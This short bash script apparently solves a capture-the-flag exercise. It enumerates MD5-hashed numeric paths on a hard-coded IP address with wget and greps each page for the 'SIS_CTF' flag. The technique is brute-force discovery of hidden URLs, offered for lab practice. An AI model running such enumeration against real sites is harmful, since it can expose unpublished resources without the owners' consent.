#!/bin/bash

URL_CTF="http://141.85.224.99:8080/"

for id in {1..4000};
do
	PATH_CTF=$(echo -n $id | md5sum | cut -d " " -f 1);
	FULL_URL="$URL_CTF$PATH_CTF";
	wget -O "index.html" -q $FULL_URL;
	cat "index.html" | grep "SIS_CTF";
	if [[ $? -eq 0 ]]; then
		break
	fi
done

echo "Found flag or reached the limit!"
